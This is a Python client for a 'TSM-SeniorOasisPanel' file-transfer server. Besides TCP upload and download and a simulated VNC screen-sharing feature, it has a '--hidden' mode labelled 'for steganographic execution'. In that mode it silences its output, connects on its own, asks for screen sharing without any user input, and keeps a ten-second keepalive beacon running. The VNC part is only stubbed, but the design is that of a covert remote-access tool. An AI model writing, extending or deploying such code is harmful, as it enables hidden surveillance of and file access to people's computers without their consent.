#!/usr/bin/env python3
"""
TSM-SeniorOasisPanel Client
A TCP file transfer client with VNC integration and hidden execution capabilities.
"""

import socket
import os
import sys
import threading
import time
import subprocess
import base64
from datetime import datetime

class TSMSeniorOasisPanelClient:
    def __init__(self, host='localhost', port=5000):
        self.host = host
        self.port = port
        self.buffer_size = 1024
        self.socket = None
        self.connected = False
        self.vnc_enabled = False
        self.hidden_mode = False

    def connect(self):
        """Connect to the TSM-SeniorOasisPanel server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.host, self.port))
            self.connected = True
            
            # Receive welcome message
            welcome = self.socket.recv(self.buffer_size).decode('utf-8')
            if not self.hidden_mode:
                print(f"TSM-SeniorOasisPanel: {welcome.strip()}")
            
            return True
        except Exception as e:
            if not self.hidden_mode:
                print(f"TSM-SeniorOasisPanel: Connection failed - {e}")
            return False

    def disconnect(self):
        """Disconnect from the server"""
        if self.socket:
            try:
                self.socket.send("EXIT\n".encode('utf-8'))
                self.socket.close()
            except:
                pass
        self.connected = False

    def upload_file(self, filename):
        """Upload a file to the server"""
        try:
            if not os.path.exists(filename):
                if not self.hidden_mode:
                    print(f"TSM-SeniorOasisPanel: File '{filename}' not found")
                return False

            file_size = os.path.getsize(filename)
            if file_size > 100 * 1024 * 1024:  # 100MB limit
                if not self.hidden_mode:
                    print("TSM-SeniorOasisPanel: File too large (max 100MB)")
                return False

            # Send upload command
            command = f"UPLOAD {os.path.basename(filename)}\n"
            self.socket.send(command.encode('utf-8'))

            # Send file size
            size_msg = f"{file_size:010d}"
            self.socket.send(size_msg.encode('utf-8'))

            # Send file data
            with open(filename, 'rb') as f:
                while True:
                    data = f.read(self.buffer_size)
                    if not data:
                        break
                    self.socket.send(data)

            # Receive confirmation
            response = self.socket.recv(self.buffer_size).decode('utf-8')
            if response.startswith("OK"):
                if not self.hidden_mode:
                    print(f"TSM-SeniorOasisPanel: File uploaded successfully!")
                return True
            else:
                if not self.hidden_mode:
                    print(f"TSM-SeniorOasisPanel: Upload failed - {response.strip()}")
                return False

        except Exception as e:
            if not self.hidden_mode:
                print(f"TSM-SeniorOasisPanel: Upload error - {e}")
            return False

    def download_file(self, filename):
        """Download a file from the server"""
        try:
            # Send download command
            command = f"DOWNLOAD {filename}\n"
            self.socket.send(command.encode('utf-8'))

            # Receive file size or error
            size_data = self.socket.recv(10).decode('utf-8')
            if size_data.startswith("ERROR"):
                if not self.hidden_mode:
                    print(f"TSM-SeniorOasisPanel: {size_data.strip()}")
                return False

            file_size = int(size_data.strip())

            # Receive file data
            received_size = 0
            with open(filename, 'wb') as f:
                while received_size < file_size:
                    data = self.socket.recv(min(self.buffer_size, file_size - received_size))
                    if not data:
                        break
                    f.write(data)
                    received_size += len(data)

            if received_size == file_size:
                if not self.hidden_mode:
                    print(f"TSM-SeniorOasisPanel: File downloaded successfully!")
                return True
            else:
                if not self.hidden_mode:
                    print("TSM-SeniorOasisPanel: Download incomplete")
                return False

        except Exception as e:
            if not self.hidden_mode:
                print(f"TSM-SeniorOasisPanel: Download error - {e}")
            return False

    def enable_vnc(self):
        """Enable VNC screen sharing"""
        try:
            self.socket.send("VNC_REQUEST\n".encode('utf-8'))
            response = self.socket.recv(self.buffer_size).decode('utf-8')
            
            if response.startswith("VNC_CONFIG"):
                self.vnc_enabled = True
                if not self.hidden_mode:
                    print("TSM-SeniorOasisPanel: VNC screen sharing enabled")
                
                # Start VNC server in background
                self._start_vnc_server()
                return True
            else:
                if not self.hidden_mode:
                    print("TSM-SeniorOasisPanel: VNC setup failed")
                return False
        except Exception as e:
            if not self.hidden_mode:
                print(f"TSM-SeniorOasisPanel: VNC error - {e}")
            return False

    def _start_vnc_server(self):
        """Start VNC server for screen sharing"""
        try:
            # This would integrate with a VNC server
            # For now, we'll simulate the VNC capability
            if not self.hidden_mode:
                print("TSM-SeniorOasisPanel: VNC server started (simulated)")
        except Exception as e:
            if not self.hidden_mode:
                print(f"TSM-SeniorOasisPanel: VNC server error - {e}")

    def run_interactive(self):
        """Run interactive client interface"""
        if not self.connect():
            return

        print("TSM-SeniorOasisPanel: Connected to server")
        print("Available commands: upload <file>, download <file>, vnc, exit")

        while self.connected:
            try:
                if not self.hidden_mode:
                    command = input("TSM-SeniorOasisPanel> ").strip()
                else:
                    # In hidden mode, run predefined commands
                    command = "vnc"  # Enable VNC by default in hidden mode
                    time.sleep(1)

                if command.lower() == 'exit':
                    break
                elif command.startswith('upload '):
                    filename = command[7:].strip()
                    self.upload_file(filename)
                elif command.startswith('download '):
                    filename = command[9:].strip()
                    self.download_file(filename)
                elif command.lower() == 'vnc':
                    self.enable_vnc()
                elif command:
                    print("TSM-SeniorOasisPanel: Unknown command")

            except KeyboardInterrupt:
                break
            except Exception as e:
                if not self.hidden_mode:
                    print(f"TSM-SeniorOasisPanel: Error - {e}")

        self.disconnect()

    def run_hidden(self):
        """Run client in hidden mode (for steganographic execution)"""
        self.hidden_mode = True
        
        # Connect and enable VNC
        if self.connect():
            self.enable_vnc()
            
            # Keep connection alive
            try:
                while self.connected:
                    time.sleep(10)  # Send keepalive every 10 seconds
                    if self.socket:
                        self.socket.send("PING\n".encode('utf-8'))
            except:
                pass
        
        self.disconnect()

def main():
    """Main function to run the client"""
    print("=" * 50)
    print("TSM-SeniorOasisPanel Client")
    print("=" * 50)
    
    # Check for hidden mode
    hidden_mode = '--hidden' in sys.argv
    
    if not hidden_mode:
        # Get server configuration
        host = input("Enter server host (default: localhost): ").strip() or 'localhost'
        port_input = input("Enter server port (default: 5000): ").strip()
        port = int(port_input) if port_input else 5000
        
        # Create and run client
        client = TSMSeniorOasisPanelClient(host=host, port=port)
        client.run_interactive()
    else:
        # Hidden mode - connect to predefined server
        client = TSMSeniorOasisPanelClient(host='localhost', port=5000)
        client.run_hidden()

if __name__ == "__main__":
    main()
